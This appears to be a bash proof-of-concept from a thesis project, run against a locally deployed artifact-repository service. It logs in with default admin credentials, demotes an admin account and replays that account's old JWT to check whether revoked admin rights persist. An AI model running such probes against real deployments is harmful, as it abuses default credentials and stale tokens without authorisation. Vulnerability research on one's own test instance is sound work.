#!/bin/bash
cd /Users/minhnguyen/IdeaProjects/graduational-thesis/infra/artifact-keeper-target/src
CF="-f docker-compose.local-dev.yml -f docker-compose.thesis.yml"
API=http://localhost:8080/api/v1
PW=ThesisPass1234
echo "=== reset DB (fresh admin/admin) ==="
docker compose $CF stop backend postgres >/dev/null 2>&1
docker compose $CF rm -f backend postgres >/dev/null 2>&1
docker volume rm src_dev_postgres_data >/dev/null 2>&1
docker compose $CF up -d postgres >/dev/null 2>&1
for i in $(seq 1 30); do [ "$(docker inspect -f '{{.State.Health.Status}}' artifact-keeper-dev-db 2>/dev/null)" = healthy ] && break; sleep 2; done
echo "postgres healthy; starting backend"
docker compose $CF up -d backend >/dev/null 2>&1
for i in $(seq 1 120); do c=$(curl -s -o /dev/null -w '%{http_code}' $API/../../health 2>/dev/null); [ "$c" = 200 ] && { echo "backend up after ~$((i*3))s"; break; }; sleep 3; done

jqpy(){ python3 -c "import sys,json;d=json.load(sys.stdin);print($1)" 2>/dev/null; }
claimval(){ python3 -c "import sys,base64,json;t='$1'.split('.')[1];t+='='*(-len(t)%4);print(json.loads(base64.urlsafe_b64decode(t)).get('$2'))" 2>/dev/null; }
login(){ curl -s -X POST $API/auth/login -H 'Content-Type: application/json' --data-binary "$(python3 -c "import json;print(json.dumps({'username':'$1','password':'$2'}))")" | jqpy "d.get('access_token','')"; }
writecode(){ local n="probe$RANDOM$RANDOM"; curl -s -o /dev/null -w '%{http_code}' -X POST $API/users -H "Authorization: Bearer $1" -H 'Content-Type: application/json' --data-binary "$(python3 -c "import json;print(json.dumps({'username':'$n','email':'$n@probe.test','password':'$PW','is_admin':False}))")"; }

echo "===== BOOTSTRAP ====="
A1=$(login admin admin); echo "admin(default) token len ${#A1}"
AID=$(claimval "$A1" sub); echo "admin id $AID"
echo "change admin pw -> $(curl -s -o /dev/null -w '%{http_code}' -X POST $API/users/$AID/password -H "Authorization: Bearer $A1" -H 'Content-Type: application/json' --data-binary "$(python3 -c "import json;print(json.dumps({'current_password':'admin','new_password':'$PW'}))")")"
A=$(login admin $PW); echo "admin re-login token len ${#A} is_admin=$(claimval "$A" is_admin)"
VC=$(curl -s -X POST $API/users -H "Authorization: Bearer $A" -H 'Content-Type: application/json' --data-binary "$(python3 -c "import json;print(json.dumps({'username':'victim','email':'victim@probe.test','password':'$PW','is_admin':True}))")")
VID=$(echo "$VC" | jqpy "d.get('id') or d.get('user',{}).get('id')"); echo "victim id $VID (raw: $(echo "$VC" | head -c 120))"
echo "viewer create -> $(curl -s -o /dev/null -w '%{http_code}' -X POST $API/users -H "Authorization: Bearer $A" -H 'Content-Type: application/json' --data-binary "$(python3 -c "import json;print(json.dumps({'username':'viewer','email':'viewer@probe.test','password':'$PW','is_admin':False}))")")"

echo; echo "===== MR-A1 ====="
VOLD=$(login victim $PW); echo "[A] V_OLD is_admin claim = $(claimval "$VOLD" is_admin)"
echo "[B] source victim(admin) create w/ V_OLD (expect 2xx) -> $(writecode "$VOLD")"
VW=$(login viewer $PW); echo "[C] viewer create (expect 403) -> $(writecode "$VW")"
echo "[D] transition admin PATCH /users/$VID is_admin=false (expect 2xx) -> $(curl -s -o /dev/null -w '%{http_code}' -X PATCH $API/users/$VID -H "Authorization: Bearer $A" -H 'Content-Type: application/json' --data-binary '{"is_admin":false}')"
VNEW=$(login victim $PW); echo "[E] fresh victim is_admin=$(claimval "$VNEW" is_admin) ; fresh create (expect 403) -> $(writecode "$VNEW")"
echo "[F] *** REPLAY V_OLD create AFTER demotion (VULN expects 2xx) -> $(writecode "$VOLD") ***"
echo "[poll] V_OLD stays 2xx? (claim-based, not cache):"
for i in 1 2 3 4; do echo "   +$((i*8))s old=$(writecode "$VOLD") fresh=$(writecode "$VNEW")"; sleep 8; done
echo "[DONE]"
